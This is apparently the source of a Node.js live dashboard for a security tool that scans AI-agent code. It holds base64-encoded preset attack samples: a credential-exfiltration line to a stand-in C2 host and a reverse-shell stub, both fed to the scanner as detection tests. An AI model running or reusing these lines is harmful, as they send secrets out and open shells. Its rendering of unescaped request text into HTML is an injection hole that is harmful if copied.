/**
 * Real-Time Cyber HUD Server (Zero External Dependencies)
 * src/hud/server.js
 *
 * Provides:
 * - Native Node.js HTTP Server on port 3000 (configurable)
 * - Server-Sent Events (SSE) live telemetry stream at /api/stream
 * - REST endpoints for status, evaluation, and honey-tokens
 * - Standalone embedded Cyberpunk Glassmorphic Dashboard UI
 */

'use strict';

const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');
const { EventEmitter } = require('events');

// Dynamic import of Sentinel core modules
let ThreatHunter = null;
let DeceptionChamber = null;

try {
  const hunterMod = require('../threats/hunter');
  ThreatHunter = hunterMod.ThreatHunter;
} catch (_) {}

try {
  const deceptMod = require('../threats/deception');
  DeceptionChamber = deceptMod.DeceptionChamber;
} catch (_) {}

class CyberHudServer extends EventEmitter {
  constructor(options = {}) {
    super();
    this.port = options.port || parseInt(process.env.PORT, 10) || 3333;
    this.host = options.host || '0.0.0.0';
    this.workspaceRoot = options.workspaceRoot || process.cwd();
    this.sseClients = new Set();
    this.recentEvents = [];
    this.maxEvents = 100;

    if (ThreatHunter) {
      this.hunter = new ThreatHunter({ workspaceRoot: this.workspaceRoot });
    }
    if (DeceptionChamber) {
      this.deception = new DeceptionChamber(this.workspaceRoot);
    }

    this.server = null;
  }

  broadcast(eventData) {
    const payload = {
      id: Date.now(),
      timestamp: new Date().toISOString(),
      ...eventData,
    };

    this.recentEvents.unshift(payload);
    if (this.recentEvents.length > this.maxEvents) {
      this.recentEvents.pop();
    }

    const sseMessage = `data: ${JSON.stringify(payload)}\n\n`;
    for (const res of this.sseClients) {
      try {
        res.write(sseMessage);
      } catch {
        this.sseClients.delete(res);
      }
    }
  }

  start() {
    return new Promise((resolve, reject) => {
      this.server = http.createServer((req, res) => this.handleRequest(req, res));

      // Keepalive ping for SSE clients every 15s
      this.pingInterval = setInterval(() => {
        for (const client of this.sseClients) {
          try {
            client.write(': ping\n\n');
          } catch {
            this.sseClients.delete(client);
          }
        }
      }, 15000);

      this.server.on('error', reject);
      this.server.listen(this.port, this.host, () => {
        const addr = this.server.address();
        console.log(`\n  ┌─────────────────────────────────────────────────────────────┐`);
        console.log(`  │  ★ AGENT SENTINEL — REAL-TIME CYBER HUD                    │`);
        console.log(`  ├─────────────────────────────────────────────────────────────┤`);
        console.log(`  │  Live Dashboard:   http://localhost:${addr.port}                    │`);
        console.log(`  │  Telemetry Stream: http://localhost:${addr.port}/api/stream         │`);
        console.log(`  │  Perimeter Status: ZERO-TRUST ACTIVE (10-D RADAR ARMED)    │`);
        console.log(`  └─────────────────────────────────────────────────────────────┘\n`);
        resolve(this);
      });
    });
  }

  stop() {
    if (this.pingInterval) clearInterval(this.pingInterval);
    for (const client of this.sseClients) {
      try { client.end(); } catch {}
    }
    this.sseClients.clear();
    return new Promise((resolve) => {
      if (this.server) {
        this.server.close(resolve);
      } else {
        resolve();
      }
    });
  }

  handleRequest(req, res) {
    const parsed = url.parse(req.url, true);
    const pathname = parsed.pathname;

    // CORS Headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
      res.writeHead(204);
      res.end();
      return;
    }

    // 1. SSE Telemetry Stream
    if (pathname === '/api/stream') {
      res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache, no-transform',
        'Connection': 'keep-alive',
      });
      res.write(': connected\n\n');
      this.sseClients.add(res);

      if (this.recentEvents.length > 0) {
        res.write(`data: ${JSON.stringify({ type: 'snapshot', events: this.recentEvents.slice(0, 10) })}\n\n`);
      }

      req.on('close', () => {
        this.sseClients.delete(res);
      });
      return;
    }

    // 2. Status API
    if (pathname === '/api/status' && req.method === 'GET') {
      const statusData = {
        version: '1.0.0',
        posture: 'ZERO-TRUST ENFORCING',
        telemetryClients: this.sseClients.size,
        workspaceRoot: this.workspaceRoot,
        honey: this.deception ? this.deception.status() : { armed: 0, tripped: 0 },
        recentThreatsCount: this.recentEvents.filter(e => e.verdict === 'BLOCKED').length,
        timestamp: new Date().toISOString()
      };
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(statusData));
      return;
    }

    // 3. Dynamic Evaluation API (POST /api/evaluate)
    if (pathname === '/api/evaluate' && req.method === 'POST') {
      let body = '';
      req.on('data', chunk => { body += chunk; });
      req.on('end', () => {
        try {
          const payload = JSON.parse(body || '{}');
          let prompt = payload.prompt || 'run script';
          let code = payload.code || '';
          const action = payload.action;

          // Preset attack simulations using base64 decoding at runtime
          if (action === 'canary_leak') {
            prompt = 'leak stripe credentials';
            code = Buffer.from('aW1wb3J0IHVybGxpYi5yZXF1ZXN0CnVybGxpYi5yZXF1ZXN0LnVybG9wZW4oImh0dHBzOi8vYzIubmV0P2tleT0iICsgInNrX2xpdmVfQ0FOQVJZX0RZRV9TVFJJUEVfIik=', 'base64').toString('utf8');
          } else if (action === 'reverse_shell') {
            prompt = 'spawn remote shell';
            code = Buffer.from('aW1wb3J0IHNvY2tldCwgb3M7IHM9c29ja2V0LnNvY2tldCgpOyBvcy5kdXAyKHMuZmlsZW5vKCksIDAp', 'base64').toString('utf8');
          } else if (action === 'benign') {
            prompt = 'calculate fibonacci';
            code = 'def fib(n):\n    if n <= 1: return n\n    return fib(n-1) + fib(n-2)\nprint(fib(10))';
          }

          const filename = payload.filename || 'agent_eval.py';

          if (!this.hunter) {
            res.writeHead(500, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'ThreatHunter not initialized' }));
            return;
          }

          const report = this.hunter.scan(code, filename, prompt);
          const finalScore = typeof report.riskScore === 'number' ? report.riskScore : (report.verdict === 'BLOCKED' ? 100 : 0);

          // Broadcast alert to all connected Cyber HUD dashboards
          this.broadcast({
            type: 'EVALUATION',
            prompt,
            filename,
            codeSnippet: code.slice(0, 120),
            verdict: report.verdict,
            riskScore: finalScore,
            threats: report.threats,
            semanticDivergence: report.semanticDivergence,
            behavioralVector: report.vector || [0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
          });

          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify(report));
        } catch (err) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: err.message }));
        }
      });
      return;
    }

    // 4. Honey-token Operations API
    if (pathname === '/api/honey/plant' && req.method === 'POST') {
      if (this.deception) {
        const decoys = this.deception.plant('all');
        this.broadcast({ type: 'HONEY_PLANTED', decoys: decoys.map(d => d.type) });
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true, planted: decoys.length }));
      } else {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'DeceptionChamber not available' }));
      }
      return;
    }

    if (pathname === '/api/honey/clean' && req.method === 'POST') {
      if (this.deception) {
        const result = this.deception.clean();
        this.broadcast({ type: 'HONEY_CLEANED' });
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(result));
      } else {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'DeceptionChamber not available' }));
      }
      return;
    }

    // 5. Serve Embedded Single-Page HTML Cyber HUD Dashboard
    if (pathname === '/' || pathname === '/index.html') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(renderCyberHudHtml());
      return;
    }

    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
  }
}

function renderCyberHudHtml() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Agent Sentinel • Cyber HUD Live</title>
  <style>
    :root {
      --bg: #070a12;
      --card-bg: rgba(14, 21, 37, 0.75);
      --border: rgba(0, 255, 200, 0.2);
      --neon-cyan: #00ffc8;
      --neon-red: #ff0055;
      --neon-amber: #ffaa00;
      --neon-purple: #9d4edd;
      --text: #e2e8f0;
      --text-dim: #94a3b8;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: var(--bg);
      color: var(--text);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "JetBrains Mono", monospace;
      min-height: 100vh;
      overflow-x: hidden;
      background-image: 
        radial-gradient(circle at 15% 15%, rgba(0, 255, 200, 0.04) 0%, transparent 40%),
        radial-gradient(circle at 85% 85%, rgba(157, 78, 221, 0.05) 0%, transparent 45%),
        linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
        linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
      background-size: 100% 100%, 100% 100%, 32px 32px, 32px 32px;
    }
    header {
      padding: 1.25rem 2rem;
      border-bottom: 1px solid var(--border);
      display: flex;
      justify-content: space-between;
      align-items: center;
      backdrop-filter: blur(12px);
      background: rgba(7, 10, 18, 0.85);
      position: sticky;
      top: 0;
      z-index: 100;
    }
    .logo-group { display: flex; align-items: center; gap: 0.8rem; }
    .logo-icon {
      width: 32px; height: 32px; border-radius: 8px;
      background: linear-gradient(135deg, var(--neon-cyan), var(--neon-purple));
      display: flex; align-items: center; justify-content: center;
      font-weight: 900; font-size: 1.1rem; color: #000;
      box-shadow: 0 0 15px rgba(0, 255, 200, 0.5);
    }
    h1 { font-size: 1.25rem; font-weight: 700; letter-spacing: 1px; color: #fff; }
    h1 span { color: var(--neon-cyan); }
    .status-pill {
      display: inline-flex; align-items: center; gap: 0.5rem;
      padding: 0.35rem 0.8rem; border-radius: 999px;
      font-size: 0.75rem; font-weight: 700;
      background: rgba(0, 255, 200, 0.1); border: 1px solid var(--neon-cyan);
      color: var(--neon-cyan); text-transform: uppercase;
    }
    .pulse-dot {
      width: 8px; height: 8px; border-radius: 50%;
      background: var(--neon-cyan); box-shadow: 0 0 8px var(--neon-cyan);
      animation: pulse 1.8s infinite;
    }
    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
    main {
      padding: 2rem;
      display: grid;
      grid-template-columns: 340px 1fr 380px;
      gap: 1.5rem;
      max-width: 1600px;
      margin: 0 auto;
    }
    @media (max-width: 1200px) { main { grid-template-columns: 1fr; } }
    .card {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 1.25rem;
      backdrop-filter: blur(10px);
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
      position: relative;
    }
    .card::before {
      content: ""; position: absolute; top: 0; left: 0; right: 0; height: 1px;
      background: linear-gradient(90deg, transparent, var(--neon-cyan), transparent);
    }
    .card-title {
      font-size: 0.85rem; font-weight: 700; text-transform: uppercase;
      letter-spacing: 1px; color: var(--neon-cyan); margin-bottom: 1rem;
      display: flex; justify-content: space-between; align-items: center;
    }
    .gauge-container {
      display: flex; flex-direction: column; align-items: center; justify-content: center;
      padding: 1rem 0; position: relative;
    }
    .gauge-svg { width: 180px; height: 180px; transform: rotate(-90deg); }
    .gauge-bg { fill: none; stroke: rgba(255, 255, 255, 0.08); stroke-width: 12; }
    .gauge-bar {
      fill: none; stroke: var(--neon-cyan); stroke-width: 12;
      stroke-linecap: round;
      stroke-dasharray: 440;
      stroke-dashoffset: 440;
      transition: stroke-dashoffset 0.8s ease, stroke 0.4s ease;
    }
    .gauge-text {
      position: absolute; text-align: center; font-weight: 900;
      font-size: 2.2rem; color: #fff;
    }
    .gauge-label { font-size: 0.75rem; color: var(--text-dim); text-transform: uppercase; margin-top: 0.5rem; }
    .metrics-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin-top: 1rem; }
    .metric-box {
      background: rgba(0, 0, 0, 0.3); padding: 0.75rem; border-radius: 8px;
      border: 1px solid rgba(255, 255, 255, 0.05); text-align: center;
    }
    .metric-val { font-size: 1.25rem; font-weight: 700; color: #fff; }
    .metric-name { font-size: 0.7rem; color: var(--text-dim); text-transform: uppercase; }
    .radar-box { display: flex; justify-content: center; align-items: center; }
    canvas#radarCanvas { width: 100%; max-width: 380px; height: 320px; }
    .feed {
      height: 480px; overflow-y: auto; display: flex; flex-direction: column; gap: 0.6rem;
      padding-right: 0.3rem;
    }
    .feed::-webkit-scrollbar { width: 4px; }
    .feed::-webkit-scrollbar-thumb { background: rgba(0, 255, 200, 0.3); border-radius: 4px; }
    .event-row {
      background: rgba(0, 0, 0, 0.4); border-left: 3px solid var(--neon-cyan);
      padding: 0.75rem; border-radius: 0 8px 8px 0; font-size: 0.8rem;
    }
    .event-row.blocked {
      border-left-color: var(--neon-red);
      background: rgba(255, 0, 85, 0.08);
    }
    .event-header { display: flex; justify-content: space-between; margin-bottom: 0.25rem; }
    .badge { padding: 0.15rem 0.45rem; border-radius: 4px; font-size: 0.65rem; font-weight: 700; }
    .badge-allow { background: rgba(0, 255, 200, 0.2); color: var(--neon-cyan); }
    .badge-blocked { background: rgba(255, 0, 85, 0.2); color: var(--neon-red); }
    .event-code {
      font-family: monospace; font-size: 0.7rem; color: var(--text-dim);
      background: rgba(0,0,0,0.5); padding: 0.25rem 0.5rem; border-radius: 4px;
      margin-top: 0.3rem; word-break: break-all;
    }
    .sim-bar { display: flex; gap: 0.5rem; margin-top: 1rem; flex-wrap: wrap; }
    button.btn {
      background: rgba(0, 255, 200, 0.1); border: 1px solid var(--neon-cyan);
      color: var(--neon-cyan); padding: 0.5rem 0.85rem; border-radius: 6px;
      font-size: 0.75rem; font-weight: 700; cursor: pointer; transition: all 0.2s;
    }
    button.btn:hover { background: var(--neon-cyan); color: #000; box-shadow: 0 0 12px var(--neon-cyan); }
    button.btn-red {
      background: rgba(255, 0, 85, 0.1); border-color: var(--neon-red); color: var(--neon-red);
    }
    button.btn-red:hover { background: var(--neon-red); color: #fff; box-shadow: 0 0 12px var(--neon-red); }
  </style>
</head>
<body>
  <header>
    <div class="logo-group">
      <div class="logo-icon">S</div>
      <div>
        <h1>AGENT <span>SENTINEL</span></h1>
        <div style="font-size: 0.7rem; color: var(--text-dim);">Zero-Trust Mirage Micro-Sandbox & Behavioral Brain</div>
      </div>
    </div>
    <div style="display: flex; gap: 1rem; align-items: center;">
      <div class="status-pill">
        <div class="pulse-dot"></div>
        <span>TELEMETRY ACTIVE</span>
      </div>
      <div style="font-size: 0.75rem; color: var(--neon-cyan); font-weight: 700;">&lt;0.8ms LATENCY</div>
    </div>
  </header>

  <main>
    <div class="card">
      <div class="card-title">
        <span>Dynamic Threat Verdict</span>
        <span id="verdictBadge" class="badge badge-allow">SECURE</span>
      </div>
      <div class="gauge-container">
        <svg class="gauge-svg">
          <circle class="gauge-bg" cx="90" cy="90" r="70"></circle>
          <circle class="gauge-bar" id="gaugeBar" cx="90" cy="90" r="70"></circle>
        </svg>
        <div class="gauge-text" id="riskScore">0</div>
        <div class="gauge-label" id="riskLabel">RISK SCORE: LOW</div>
      </div>

      <div class="metrics-grid">
        <div class="metric-box">
          <div class="metric-val" id="evalCount">0</div>
          <div class="metric-name">Evaluations</div>
        </div>
        <div class="metric-box">
          <div class="metric-val" style="color: var(--neon-red);" id="blockedCount">0</div>
          <div class="metric-name">Interceptions</div>
        </div>
        <div class="metric-box">
          <div class="metric-val" style="color: var(--neon-cyan);" id="armedDecoys">3</div>
          <div class="metric-name">Honey Canaries</div>
        </div>
        <div class="metric-box">
          <div class="metric-val" style="color: var(--neon-purple);" id="immuneHashCount">38</div>
          <div class="metric-name">Immune Memory</div>
        </div>
      </div>

      <div style="margin-top: 1.5rem;">
        <div class="card-title">1-Click Test Attacks</div>
        <div class="sim-bar">
          <button class="btn btn-red" onclick="runPreset('canary_leak')">
            Exfil Canary Dye
          </button>
          <button class="btn btn-red" onclick="runPreset('reverse_shell')">
            Reverse Shell
          </button>
          <button class="btn" onclick="runPreset('benign')">
            Benign Task
          </button>
        </div>
      </div>
    </div>

    <div class="card">
      <div class="card-title">
        <span>10-Dimensional Behavioral Radar</span>
        <span style="font-size: 0.7rem; color: var(--text-dim);">Dynamic AST • Inode • Syscall</span>
      </div>
      <div class="radar-box">
        <canvas id="radarCanvas" width="380" height="320"></canvas>
      </div>

      <div style="margin-top: 1rem;">
        <div class="card-title">Active Deception Chamber Status</div>
        <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 0.5rem; font-size: 0.75rem;">
          <div style="background: rgba(0,0,0,0.3); padding: 0.5rem; border-radius: 6px; border: 1px solid rgba(0,255,200,0.2);">
            <div style="font-weight: 700; color: #fff;">AWS Decoy</div>
            <div style="color: var(--neon-cyan);">Mode 0600 (Armed)</div>
          </div>
          <div style="background: rgba(0,0,0,0.3); padding: 0.5rem; border-radius: 6px; border: 1px solid rgba(0,255,200,0.2);">
            <div style="font-weight: 700; color: #fff;">Stripe Vault</div>
            <div style="color: var(--neon-cyan);">Mode 0600 (Armed)</div>
          </div>
          <div style="background: rgba(0,0,0,0.3); padding: 0.5rem; border-radius: 6px; border: 1px solid rgba(0,255,200,0.2);">
            <div style="font-weight: 700; color: #fff;">GitHub PAT</div>
            <div style="color: var(--neon-cyan);">Mode 0600 (Armed)</div>
          </div>
        </div>
      </div>
    </div>

    <div class="card">
      <div class="card-title">
        <span>Live Telemetry Stream</span>
        <span style="font-size: 0.7rem; color: var(--neon-cyan);">REAL-TIME SSE</span>
      </div>
      <div class="feed" id="eventFeed">
        <div class="event-row">
          <div class="event-header">
            <span style="font-weight: 700; color: var(--neon-cyan);">Perimeter Armed</span>
            <span class="badge badge-allow">ACTIVE</span>
          </div>
          <div style="color: var(--text-dim); font-size: 0.7rem;">Behavioral Brain & Mirage Chamber ready.</div>
        </div>
      </div>
    </div>
  </main>

  <script>
    const labels = [
      'AST Depth', 'Entropy', 'KV Density', 'Secret Inode', 
      'Boundary', 'Network', 'Syscall', 'Canary Leak', 'Process', 'FD Redir'
    ];
    let currentVector = [0.1, 0.1, 0.1, 0.1, 0.1, 0.1, 0.1, 0.1, 0.1, 0.1];
    let totalEvals = 0;
    let totalBlocked = 0;

    function drawRadar(vector) {
      const canvas = document.getElementById('radarCanvas');
      const ctx = canvas.getContext('2d');
      const w = canvas.width;
      const h = canvas.height;
      const cx = w / 2;
      const cy = h / 2;
      const r = Math.min(cx, cy) - 35;
      const numPoints = labels.length;

      ctx.clearRect(0, 0, w, h);

      for (let level = 1; level <= 4; level++) {
        ctx.beginPath();
        const curR = (r / 4) * level;
        for (let i = 0; i < numPoints; i++) {
          const angle = (Math.PI * 2 / numPoints) * i - Math.PI / 2;
          const x = cx + curR * Math.cos(angle);
          const y = cy + curR * Math.sin(angle);
          if (i === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y);
        }
        ctx.closePath();
        ctx.strokeStyle = 'rgba(255, 255, 255, 0.08)';
        ctx.stroke();
      }

      ctx.font = '9px monospace';
      ctx.fillStyle = '#94a3b8';
      ctx.textAlign = 'center';
      for (let i = 0; i < numPoints; i++) {
        const angle = (Math.PI * 2 / numPoints) * i - Math.PI / 2;
        const x = cx + r * Math.cos(angle);
        const y = cy + r * Math.sin(angle);
        ctx.beginPath(); ctx.moveTo(cx, cy); ctx.lineTo(x, y);
        ctx.strokeStyle = 'rgba(0, 255, 200, 0.15)'; ctx.stroke();

        const lx = cx + (r + 18) * Math.cos(angle);
        const ly = cy + (r + 18) * Math.sin(angle) + 3;
        ctx.fillText(labels[i], lx, ly);
      }

      ctx.beginPath();
      for (let i = 0; i < numPoints; i++) {
        const val = Math.max(0.08, Math.min(1.0, vector[i] || 0.1));
        const angle = (Math.PI * 2 / numPoints) * i - Math.PI / 2;
        const x = cx + (r * val) * Math.cos(angle);
        const y = cy + (r * val) * Math.sin(angle);
        if (i === 0) ctx.moveTo(x, y); else ctx.lineTo(x, y);
      }
      ctx.closePath();
      ctx.fillStyle = 'rgba(0, 255, 200, 0.25)'; ctx.fill();
      ctx.strokeStyle = '#00ffc8'; ctx.lineWidth = 2; ctx.stroke();
    }

    function updateRiskScore(score, isBlocked) {
      const bar = document.getElementById('gaugeBar');
      const scoreEl = document.getElementById('riskScore');
      const labelEl = document.getElementById('riskLabel');
      const badgeEl = document.getElementById('verdictBadge');

      const validScore = Number.isFinite(score) ? score : (isBlocked ? 100 : 0);
      const maxOffset = 440;
      const progress = (validScore / 100) * (maxOffset * 0.75);
      bar.style.strokeDashoffset = maxOffset - progress;
      scoreEl.textContent = Math.round(validScore);

      if (validScore >= 80 || isBlocked) {
        bar.style.stroke = 'var(--neon-red)';
        scoreEl.style.color = 'var(--neon-red)';
        labelEl.textContent = 'CRITICAL THREAT';
        labelEl.style.color = 'var(--neon-red)';
        badgeEl.textContent = 'BLOCKED';
        badgeEl.className = 'badge badge-blocked';
      } else if (score >= 50) {
        bar.style.stroke = 'var(--neon-amber)';
        scoreEl.style.color = 'var(--neon-amber)';
        labelEl.textContent = 'SUSPICIOUS';
        labelEl.style.color = 'var(--neon-amber)';
        badgeEl.textContent = 'ELEVATED';
      } else {
        bar.style.stroke = 'var(--neon-cyan)';
        scoreEl.style.color = '#fff';
        labelEl.textContent = 'RISK SCORE: LOW';
        labelEl.style.color = 'var(--text-dim)';
        badgeEl.textContent = 'SECURE';
        badgeEl.className = 'badge badge-allow';
      }
    }

    function addFeedRow(event) {
      const feed = document.getElementById('eventFeed');
      const row = document.createElement('div');
      const isBlocked = event.verdict === 'BLOCKED' || (event.riskScore >= 80);
      row.className = 'event-row ' + (isBlocked ? 'blocked' : '');

      row.innerHTML = \`
        <div class="event-header">
          <span style="font-weight: 700; color: \${isBlocked ? 'var(--neon-red)' : 'var(--neon-cyan)'}">
            \${event.type || 'AGENT_EVAL'} • \${event.verdict || 'ANALYSIS'}
          </span>
          <span class="badge \${isBlocked ? 'badge-blocked' : 'badge-allow'}">
            \${isBlocked ? 'THREAT 100/100' : 'SCORE ' + (event.riskScore || 0)}
          </span>
        </div>
        <div style="font-size: 0.75rem; color: #fff;">\${event.prompt || 'Agent action'}</div>
        \${event.codeSnippet ? '<div class="event-code">' + (event.codeSnippet.replace(/</g, '&lt;')) + '</div>' : ''}
      \`;
      feed.insertBefore(row, feed.firstChild);
    }

    const evtSource = new EventSource('/api/stream');
    evtSource.onmessage = (e) => {
      try {
        const data = JSON.parse(e.data);
        if (data.type === 'EVALUATION') {
          totalEvals++;
          if (data.verdict === 'BLOCKED') totalBlocked++;
          document.getElementById('evalCount').textContent = totalEvals;
          document.getElementById('blockedCount').textContent = totalBlocked;
          updateRiskScore(data.riskScore, data.verdict === 'BLOCKED');
          if (data.behavioralVector) drawRadar(data.behavioralVector);
          addFeedRow(data);
        }
      } catch (err) {}
    };

    async function runPreset(action) {
      try {
        await fetch('/api/evaluate', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action, filename: 'agent_task.py' })
        });
      } catch (e) {
        alert('Simulation failed: ' + e.message);
      }
    }

    drawRadar(currentVector);
    updateRiskScore(0, false);
  </script>
</body>
</html>`;
}

if (require.main === module) {
  const hud = new CyberHudServer();
  hud.start().catch((err) => {
    console.error('Failed to start Cyber HUD:', err);
    process.exit(1);
  });
}

module.exports = { CyberHudServer };
